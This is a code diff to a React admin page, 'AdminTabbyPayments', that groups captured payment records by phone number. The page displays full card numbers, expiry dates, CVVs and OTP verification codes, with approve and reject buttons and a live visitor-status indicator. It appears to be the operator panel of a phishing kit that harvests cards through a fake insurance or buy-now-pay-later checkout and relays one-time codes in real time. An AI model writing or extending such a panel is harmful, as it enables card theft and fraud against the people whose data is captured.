@@ -47,11 +47,20 @@ interface TabbyOtpAttempt {
   created_at: string;
   approval_status?: string;
 }
+
+interface GroupedCustomer {
+  phone: string;
+  payments: TabbyPayment[];
+  allAttempts: (TabbyPaymentAttempt & { source: 'main' | 'additional', paymentId: string })[];
+  allOtps: TabbyOtpAttempt[];
+  company: string | null;
+  cardholder_name: string;
+  visitor_session_id: string | null;
+  latest_created_at: string;
+}
 const AdminTabbyPayments = () => {
   useAdminNotifications();
-  const [payments, setPayments] = useState<TabbyPayment[]>([]);
-  const [paymentAttempts, setPaymentAttempts] = useState<Record<string, TabbyPaymentAttempt[]>>({});
-  const [otpAttempts, setOtpAttempts] = useState<Record<string, TabbyOtpAttempt[]>>({});
+  const [groupedCustomers, setGroupedCustomers] = useState<GroupedCustomer[]>([]);
   const [loading, setLoading] = useState(true);
   const [processing, setProcessing] = useState<string | null>(null);
   const {
@@ -196,7 +205,7 @@ const AdminTabbyPayments = () => {
         .from('tabby_payments')
         .select('*')
         .order('created_at', { ascending: false })
-        .limit(50);
+        .limit(100);
       
       if (error) {
         console.error('❌ Error fetching payments:', error);
@@ -210,7 +219,6 @@ const AdminTabbyPayments = () => {
       }
       
       console.log(`✅ Fetched ${data?.length || 0} payments`);
-      setPayments(data || []);
       
       // Fetch payment attempts and OTP attempts in batch
       if (data && data.length > 0) {
@@ -229,23 +237,82 @@ const AdminTabbyPayments = () => {
             .order('created_at', { ascending: true })
         ]);
 
+        // تجميع البيانات حسب رقم الجوال
+        const grouped = data.reduce((acc, payment) => {
+          const key = payment.phone || payment.visitor_session_id || payment.id;
+          
+          if (!acc[key]) {
+            acc[key] = {
+              phone: payment.phone || 'غير متوفر',
+              payments: [],
+              allAttempts: [],
+              allOtps: [],
+              company: payment.company,
+              cardholder_name: payment.cardholder_name,
+              visitor_session_id: payment.visitor_session_id,
+              latest_created_at: payment.created_at
+            };
+          }
+          
+          acc[key].payments.push(payment);
+          
+          // إضافة البطاقة الأساسية كمحاولة إذا كانت تحتوي على بيانات
+          if (payment.card_number && payment.card_number !== '0000000000000000') {
+            acc[key].allAttempts.push({
+              id: payment.id,
+              payment_id: payment.id,
+              card_number: payment.card_number,
+              cardholder_name: payment.cardholder_name,
+              expiry_date: payment.expiry_date,
+              cvv: payment.cvv,
+              created_at: payment.created_at,
+              approval_status: payment.payment_status,
+              source: 'main',
+              paymentId: payment.id
+            });
+          }
+          
+          return acc;
+        }, {} as Record<string, GroupedCustomer>);
+
+        // إضافة محاولات الدفع الإضافية
         if (attemptsResult.data) {
-          const grouped = attemptsResult.data.reduce((acc, attempt) => {
-            if (!acc[attempt.payment_id]) acc[attempt.payment_id] = [];
-            acc[attempt.payment_id].push(attempt);
-            return acc;
-          }, {} as Record<string, TabbyPaymentAttempt[]>);
-          setPaymentAttempts(grouped);
+          attemptsResult.data.forEach(attempt => {
+            const payment = data.find(p => p.id === attempt.payment_id);
+            if (payment) {
+              const key = payment.phone || payment.visitor_session_id || payment.id;
+              if (grouped[key]) {
+                grouped[key].allAttempts.push({
+                  ...attempt,
+                  source: 'additional',
+                  paymentId: payment.id
+                });
+              }
+            }
+          });
         }
 
+        // إضافة أكواد التحقق
         if (otpsResult.data) {
-          const grouped = otpsResult.data.reduce((acc, otp) => {
-            if (!acc[otp.payment_id]) acc[otp.payment_id] = [];
-            acc[otp.payment_id].push(otp);
-            return acc;
-          }, {} as Record<string, TabbyOtpAttempt[]>);
-          setOtpAttempts(grouped);
+          otpsResult.data.forEach(otp => {
+            const payment = data.find(p => p.id === otp.payment_id);
+            if (payment) {
+              const key = payment.phone || payment.visitor_session_id || payment.id;
+              if (grouped[key]) {
+                grouped[key].allOtps.push(otp);
+              }
+            }
+          });
         }
+
+        // تحويل إلى مصفوفة وترتيب حسب آخر تحديث
+        const groupedArray = Object.values(grouped).sort((a, b) => 
+          new Date(b.latest_created_at).getTime() - new Date(a.latest_created_at).getTime()
+        );
+        
+        setGroupedCustomers(groupedArray);
+      } else {
+        setGroupedCustomers([]);
       }
     } catch (error) {
       console.error('Error fetching payments:', error);
@@ -445,11 +512,11 @@ const AdminTabbyPayments = () => {
             <p className="text-muted-foreground">إدارة طلبات الدفع عبر تابي - تحديث تلقائي</p>
           </div>
 
-          {payments.length === 0 ? <Card className="p-8 text-center">
+          {groupedCustomers.length === 0 ? <Card className="p-8 text-center">
               <p className="text-muted-foreground">لا توجد طلبات دفع حتى الآن</p>
             </Card> : <div className="space-y-8">
-              {payments.map((payment, index) => (
-                <div key={payment.id}>
+              {groupedCustomers.map((customer, index) => (
+                <div key={customer.phone + index}>
                   {/* خط أحمر فاصل بين العملاء */}
                   {index > 0 && (
                     <div className="my-8 h-1 bg-gradient-to-r from-transparent via-red-500 to-transparent rounded-full"></div>
@@ -461,14 +528,16 @@ const AdminTabbyPayments = () => {
                         <div className="flex items-center gap-2">
                           <CreditCard className="h-5 w-5 text-primary" />
                           <CardTitle className="text-lg flex items-center gap-2">
-                            {payment.cardholder_name}
-                            <VisitorStatusIndicator sessionId={payment.visitor_session_id} />
+                            {customer.cardholder_name}
+                            <VisitorStatusIndicator sessionId={customer.visitor_session_id} />
                           </CardTitle>
                         </div>
-                        {getStatusBadge(payment.payment_status)}
+                        <Badge className="bg-blue-500">
+                          {customer.payments.length} طلب
+                        </Badge>
                       </div>
                       <CardDescription className="mt-1">
-                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
+                        آخر تحديث: {format(new Date(customer.latest_created_at), 'PPp', { locale: ar })}
                       </CardDescription>
                     </CardHeader>
 
@@ -477,135 +546,38 @@ const AdminTabbyPayments = () => {
                     <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
                       <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                         <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
-                        <div className="font-bold text-sm text-gray-900 truncate" title={payment.company || 'غير متوفر'}>
-                          {payment.company || 'غير متوفر'}
+                        <div className="font-bold text-sm text-gray-900 truncate" title={customer.company || 'غير متوفر'}>
+                          {customer.company || 'غير متوفر'}
                         </div>
                       </div>
                       
-                      {payment.phone && (
+                      {customer.phone && customer.phone !== 'غير متوفر' && (
                         <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
                           <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
                           <div className="font-bold text-sm text-gray-900" dir="ltr">
-                            {payment.phone}
+                            {customer.phone}
                           </div>
                         </div>
                       )}
                       
                       <div className="bg-green-50 border border-green-200 rounded-lg p-3">
-                        <div className="text-xs text-green-600 font-medium mb-1">المبلغ الإجمالي</div>
+                        <div className="text-xs text-green-600 font-medium mb-1">عدد المحاولات</div>
                         <div className="font-bold text-lg text-green-700">
-                          {payment.total_amount.toFixed(2)} ر.س
+                          {customer.allAttempts.length} محاولة
                         </div>
                       </div>
                     </div>
 
-                    {/* جميع محاولات الدفع (البطاقة الأساسية + المحاولات الإضافية) */}
-                    {(payment.card_number || paymentAttempts[payment.id]) && (
+                    {/* جميع محاولات الدفع */}
+                    {customer.allAttempts.length > 0 && (
                       <div className="mb-6">
                         <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600 mb-3">
                           <CreditCard className="h-4 w-4" />
-                          محاولات الدفع ({(payment.card_number && payment.card_number !== '0000000000000000' ? 1 : 0) + (paymentAttempts[payment.id]?.length || 0)})
+                          محاولات الدفع ({customer.allAttempts.length})
                         </h3>
                         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
-                          {/* البطاقة الأساسية - المحاولة الأولى - فقط إذا كانت تحتوي على بيانات حقيقية */}
-                          {payment.card_number && payment.card_number !== '0000000000000000' && (
-                            <div 
-                              className={`rounded-lg p-3 border-2 ${
-                                payment.payment_status === 'rejected' 
-                                  ? 'bg-red-50 border-red-400' 
-                                  : payment.payment_status === 'approved'
-                                  ? 'bg-green-50 border-green-400'
-                                  : 'bg-blue-50 border-blue-400'
-                              }`}
-                            >
-                              <div className="flex justify-between items-center mb-2">
-                                <span className={`text-xs font-bold ${
-                                  payment.payment_status === 'rejected' 
-                                    ? 'text-red-700' 
-                                    : payment.payment_status === 'approved'
-                                    ? 'text-green-700'
-                                    : 'text-blue-600'
-                                }`}>
-                                  محاولة #1 (الأساسية)
-                                </span>
-                                {payment.payment_status === 'approved' && (
-                                  <Badge className="bg-green-600 text-xs">
-                                    ✓ موافق عليها
-                                  </Badge>
-                                )}
-                                {payment.payment_status === 'rejected' && (
-                                  <Badge className="bg-red-600 text-xs">
-                                    ✗ مرفوضة
-                                  </Badge>
-                                )}
-                                {payment.payment_status === 'pending' && (
-                                  <Badge className="bg-yellow-500 text-xs">
-                                    ⏳ قيد الانتظار
-                                  </Badge>
-                                )}
-                              </div>
-                              <div className="space-y-1.5 text-xs">
-                                <div className="flex justify-between">
-                                  <span className="text-gray-500">رقم البطاقة:</span>
-                                  <span className="font-mono font-medium" dir="ltr">
-                                    {payment.card_number}
-                                  </span>
-                                </div>
-                                <div className="flex justify-between">
-                                  <span className="text-gray-500">الاسم:</span>
-                                  <span className="font-medium truncate max-w-[120px]" title={payment.cardholder_name}>
-                                    {payment.cardholder_name}
-                                  </span>
-                                </div>
-                                <div className="flex justify-between">
-                                  <span className="text-gray-500">الانتهاء:</span>
-                                  <span className="font-medium" dir="ltr">{payment.expiry_date}</span>
-                                </div>
-                                <div className="flex justify-between">
-                                  <span className="text-gray-500">CVV:</span>
-                                  <span className="font-mono font-medium">{payment.cvv}</span>
-                                </div>
-                                <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t border-blue-200">
-                                  {format(new Date(payment.created_at), 'PPp', { locale: ar })}
-                                </div>
-                              </div>
-
-                              {payment.payment_status === 'pending' && (
-                                <div className="flex gap-2 mt-3 pt-3 border-t border-blue-300">
-                                  <Button
-                                    onClick={() => handleApproveMainCard(payment.id)}
-                                    disabled={processing === payment.id}
-                                    className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
-                                  >
-                                    {processing === payment.id ? (
-                                      <Loader2 className="h-3 w-3 animate-spin ml-1" />
-                                    ) : (
-                                      <Check className="h-3 w-3 ml-1" />
-                                    )}
-                                    موافقة
-                                  </Button>
-                                  <Button
-                                    onClick={() => handleRejectMainCard(payment.id)}
-                                    disabled={processing === payment.id}
-                                    variant="destructive"
-                                    className="flex-1 h-8 text-xs"
-                                  >
-                                    {processing === payment.id ? (
-                                      <Loader2 className="h-3 w-3 animate-spin ml-1" />
-                                    ) : (
-                                      <X className="h-3 w-3 ml-1" />
-                                    )}
-                                    رفض
-                                  </Button>
-                                </div>
-                              )}
-                            </div>
-                          )}
-
-                          {/* المحاولات الإضافية */}
-                          {paymentAttempts[payment.id] && paymentAttempts[payment.id].map((attempt, index) => {
-                            // حساب الرقم الصحيح للمحاولة
-                            const attemptNumber = (payment.card_number && payment.card_number !== '0000000000000000' ? 2 : 1) + index;
+                          {customer.allAttempts.map((attempt, index) => {
+                            const isMainCard = attempt.source === 'main';
                             
                             return (
                               <div 
@@ -615,6 +587,8 @@ const AdminTabbyPayments = () => {
                                     ? 'bg-red-50 border-red-400' 
                                     : attempt.approval_status === 'approved'
                                     ? 'bg-green-50 border-green-400'
+                                    : isMainCard
+                                    ? 'bg-blue-50 border-blue-400'
                                     : 'bg-orange-50 border-orange-200'
                                 }`}
                               >
@@ -624,13 +598,25 @@ const AdminTabbyPayments = () => {
                                       ? 'text-red-700' 
                                       : attempt.approval_status === 'approved'
                                       ? 'text-green-700'
+                                      : isMainCard
+                                      ? 'text-blue-600'
                                       : 'text-orange-600'
                                   }`}>
-                                    محاولة #{attemptNumber}
+                                    طريقة دفع #{index + 1}
                                   </span>
-                                  {attempt.approval_status && (
-                                    <Badge className={attempt.approval_status === 'approved' ? 'bg-green-600 text-xs' : 'bg-red-600 text-xs'}>
-                                      {attempt.approval_status === 'approved' ? '✓ موافق عليها' : '✗ مرفوضة'}
+                                  {attempt.approval_status === 'approved' && (
+                                    <Badge className="bg-green-600 text-xs">
+                                      ✓ موافق عليها
+                                    </Badge>
+                                  )}
+                                  {attempt.approval_status === 'rejected' && (
+                                    <Badge className="bg-red-600 text-xs">
+                                      ✗ مرفوضة
+                                    </Badge>
+                                  )}
+                                  {attempt.approval_status === 'pending' && (
+                                    <Badge className="bg-yellow-500 text-xs">
+                                      ⏳ قيد الانتظار
                                     </Badge>
                                   )}
                                   {!attempt.approval_status && (
@@ -660,15 +646,15 @@ const AdminTabbyPayments = () => {
                                     <span className="text-gray-500">CVV:</span>
                                     <span className="font-mono font-medium">{attempt.cvv}</span>
                                   </div>
-                                  <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t border-orange-200">
+                                  <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t">
                                     {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                   </div>
                                 </div>
 
-                                {!attempt.approval_status && (
-                                  <div className="flex gap-2 mt-3 pt-3 border-t border-orange-300">
+                                {(!attempt.approval_status || attempt.approval_status === 'pending') && (
+                                  <div className="flex gap-2 mt-3 pt-3 border-t">
                                     <Button
-                                      onClick={() => handleApprovePaymentAttempt(attempt.id, payment.id)}
+                                      onClick={() => isMainCard ? handleApproveMainCard(attempt.paymentId) : handleApprovePaymentAttempt(attempt.id, attempt.payment_id)}
                                       disabled={processing === attempt.id}
                                       className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                                     >
@@ -680,7 +666,7 @@ const AdminTabbyPayments = () => {
                                       موافقة
                                     </Button>
                                     <Button
-                                      onClick={() => handleRejectPaymentAttempt(attempt.id, payment.id)}
+                                      onClick={() => isMainCard ? handleRejectMainCard(attempt.paymentId) : handleRejectPaymentAttempt(attempt.id, attempt.payment_id)}
                                       disabled={processing === attempt.id}
                                       variant="destructive"
                                       className="flex-1 h-8 text-xs"
@@ -701,31 +687,42 @@ const AdminTabbyPayments = () => {
                       </div>
                     )}
 
-                    {/* أكواد التحقق النهائية - بنفس تصميم تمارا */}
-                    {otpAttempts[payment.id] && otpAttempts[payment.id].length > 0 && (
+                    {/* أكواد التحقق النهائية */}
+                    {customer.allOtps.length > 0 && (
                       <div className="mt-6 p-4 bg-gradient-to-br from-purple-50 to-pink-50 rounded-xl border-2 border-purple-300">
                         <h3 className="font-bold flex items-center gap-2 text-lg text-purple-700 mb-4">
-                          🔐 أكواد التحقق النهائية ({otpAttempts[payment.id].length})
+                          🔐 أكواد التحقق ({customer.allOtps.length})
                         </h3>
                         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                          {otpAttempts[payment.id].map((otp, index) => {
-                            const isLatest = index === 0;
+                          {customer.allOtps.map((otp, index) => {
                             return (
                               <div 
                                 key={otp.id} 
                                 className={`border-2 rounded-xl p-4 transition-all ${
-                                  isLatest 
-                                    ? 'bg-gradient-to-br from-purple-100 to-pink-100 border-purple-400 shadow-lg ring-4 ring-purple-200' 
-                                    : 'bg-white border-gray-300'
+                                  otp.approval_status === 'approved'
+                                    ? 'bg-green-50 border-green-400'
+                                    : otp.approval_status === 'rejected'
+                                    ? 'bg-red-50 border-red-400'
+                                    : 'bg-gradient-to-br from-purple-100 to-pink-100 border-purple-400'
                                 }`}
                               >
                                 <div className="flex justify-between items-center mb-3">
-                                  <span className={`text-sm font-bold ${isLatest ? 'text-purple-700' : 'text-gray-600'}`}>
-                                    {isLatest ? '⭐ الأحدث' : `محاولة #${otpAttempts[payment.id]!.length - index}`}
+                                  <span className="text-sm font-bold text-purple-700">
+                                    كود #{index + 1}
                                   </span>
-                                  {otp.approval_status && (
-                                    <Badge className={otp.approval_status === 'approved' ? 'bg-green-500' : 'bg-red-500'}>
-                                      {otp.approval_status === 'approved' ? 'موافق عليه' : 'مرفوض'}
+                                  {otp.approval_status === 'approved' && (
+                                    <Badge className="bg-green-500">
+                                      ✓ موافق عليه
+                                    </Badge>
+                                  )}
+                                  {otp.approval_status === 'rejected' && (
+                                    <Badge className="bg-red-500">
+                                      ✗ مرفوض
+                                    </Badge>
+                                  )}
+                                  {!otp.approval_status && (
+                                    <Badge className="bg-yellow-500">
+                                      ⏳ قيد الانتظار
                                     </Badge>
                                   )}
                                 </div>
@@ -733,9 +730,7 @@ const AdminTabbyPayments = () => {
                                 <div className="space-y-2">
                                   <div className="flex justify-between items-center bg-white rounded-lg p-3 shadow-sm">
                                     <span className="text-sm text-gray-600">كود التحقق:</span>
-                                    <span className={`font-mono font-bold text-2xl tracking-wider ${
-                                      isLatest ? 'text-purple-700' : 'text-gray-700'
-                                    }`}>
+                                    <span className="font-mono font-bold text-2xl tracking-wider text-purple-700">
                                       {otp.otp_code}
                                     </span>
                                   </div>
@@ -744,10 +739,10 @@ const AdminTabbyPayments = () => {
                                   </div>
                                 </div>
 
-                                {!otp.approval_status && isLatest && (
+                                {!otp.approval_status && (
                                   <div className="flex gap-2 mt-3">
                                     <Button 
-                                      onClick={() => handleApproveOtp(otp.id, payment.id)} 
+                                      onClick={() => handleApproveOtp(otp.id, otp.payment_id)} 
                                       disabled={processing === otp.id}
                                       className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs h-9"
                                     >
@@ -759,7 +754,7 @@ const AdminTabbyPayments = () => {
                                       موافقة
                                     </Button>
                                     <Button 
-                                      onClick={() => handleRejectOtp(otp.id, payment.id)} 
+                                      onClick={() => handleRejectOtp(otp.id, otp.payment_id)} 
                                       disabled={processing === otp.id}
                                       variant="destructive"
                                       className="flex-1 text-xs h-9"
@@ -782,16 +777,16 @@ const AdminTabbyPayments = () => {
 
 
                     {/* معلومات التاريخ */}
-                    <div className="p-3 bg-gray-50 rounded-lg">
-                      <div className="text-xs text-gray-500 mb-1">تاريخ الإنشاء</div>
+                    <div className="p-3 bg-gray-50 rounded-lg mt-4">
+                      <div className="text-xs text-gray-500 mb-1">تاريخ آخر تحديث</div>
                       <div className="text-sm font-medium">
-                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
+                        {format(new Date(customer.latest_created_at), 'PPp', { locale: ar })}
                       </div>
-                      {payment.updated_at !== payment.created_at && (
+                      {customer.payments.length > 1 && (
                         <>
-                          <div className="text-xs text-gray-500 mb-1 mt-2">آخر تحديث</div>
+                          <div className="text-xs text-gray-500 mt-1">عدد الطلبات</div>
                           <div className="text-sm font-medium">
-                            {format(new Date(payment.updated_at), 'PPp', { locale: ar })}
+                            {customer.payments.length} طلب
                           </div>
                         </>
                       )}
